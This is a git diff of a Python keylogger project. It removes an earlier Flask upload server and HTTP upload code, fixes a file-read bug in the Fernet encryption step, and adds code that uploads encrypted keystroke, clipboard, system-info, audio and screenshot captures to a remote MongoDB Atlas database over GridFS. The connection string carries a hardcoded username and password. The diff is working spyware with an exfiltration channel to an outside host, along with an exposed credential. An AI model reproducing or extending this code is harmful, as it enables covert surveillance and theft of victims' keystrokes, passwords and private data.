@@ -33,7 +33,9 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-
+# Library for MongoDB
+from pymongo import MongoClient
+import gridfs
 # Log file 
 
 keys_info = "key_log.txt"
@@ -55,53 +57,6 @@ file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
 file_merge = file_path + extend
 
-# Flask upload server Functionality
-def start_upload_server(upload_folder='uploads', host='0.0.0.0', port=5000):
-    app = Flask(__name__)
-    os
-    
-    @app.route('/upload', methods=['POST'])
-    def upload_file():
-        if 'file' not in request.files:
-            return "No file part in the request", 400
-        
-        file = request.files['file']
-        
-        if file.filename == '':
-            return "No selected file", 400
-        
-        file_path = os.path.join(upload_folder, file.filename)
-        file.save(file_path)
-        print(f"[SERVER] Received file: {file.filename}")
-        return f'File {file.filename} uploaded successfully', 200
-
-    print(f"[SERVER] Starting upload server at {host}:{port} with upload folder '{upload_folder}'")
-    app.run(host=host, port=port)
-
-# Local IP Address Functionality
-def get_local_ip():
-    s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(('10.255.255.255', 1))
-        local_ip = s.getsockname()[0]
-    except Exception:
-        local_ip = '127.0.0.1'
-    finally:
-        s.close()
-    return local_ip
-
-#File upload functionality
-def upload_encrypted_files(encrypted_files, server_url):
-    for file in encrypted_files:
-        try:
-            with open(file, "rb") as f:
-                response = requests.post(server_url, files={'file': (os.path.basename(file), f)})
-            if response.status_code == 200:
-                print(f"[UPLOAD] {file} uploaded successfully.")
-            else:
-                print(f"[UPLOAD] Failed to upload {file}: {response.text}")
-        except Exception as e:
-            print(f"[UPLOAD] Error uploading {file}: {e}")
 
 def get_system_info():
     with open(file_path + extend + "sys_info.txt", "a") as f:
@@ -217,10 +172,10 @@ count = 0
 for encrypting_file in files_to_encrypt:
 
     with open(files_to_encrypt[count], "rb") as f:
-        data = f.read
+        data = f.read()
     
     fernet = Fernet(key)
-    encrypted = fernet.encrypt(data())
+    encrypted = fernet.encrypt(data)
 
     with open(encrypted_files[count], "wb") as f:
         f.write(encrypted)
@@ -228,3 +183,37 @@ for encrypting_file in files_to_encrypt:
     count += 1
 
 time.sleep(120)
+
+# MongoDB connection
+
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
+
+uri = "mongodb+srv://keyloggerproj67:p3fogkOgOedIDFIA@keylogger1.wvs2pa8.mongodb.net/?retryWrites=true&w=majority&appName=Keylogger1"
+
+# Create a new client and connect to the server
+client = MongoClient(uri, server_api=ServerApi('1'))
+
+# Send a ping to confirm a successful connection
+try:
+    client.admin.command('ping')
+    print("Pinged your deployment. You successfully connected to MongoDB!")
+except Exception as e:
+    print(e)
+
+client = MongoClient(uri, server_api=ServerApi('1'))
+db = client["Keylogger1"]
+fs = gridfs.GridFS(db)
+
+encrypted_files = [file_merge + key_info_e, file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + audio_info, file_merge + screenshot_info]
+
+for file in encrypted_files:
+    filename = os.path.basename(file)
+    try:
+        with open(file, "rb") as f:
+            data = f.read()
+            fs.put(data, filename=filename)
+            print(f"Uploaded {filename} to MongoDB successfully.")
+
+    except Exception as e:
+        print(f"Failed to upload {filename} to MongoDB: {str(e)}")
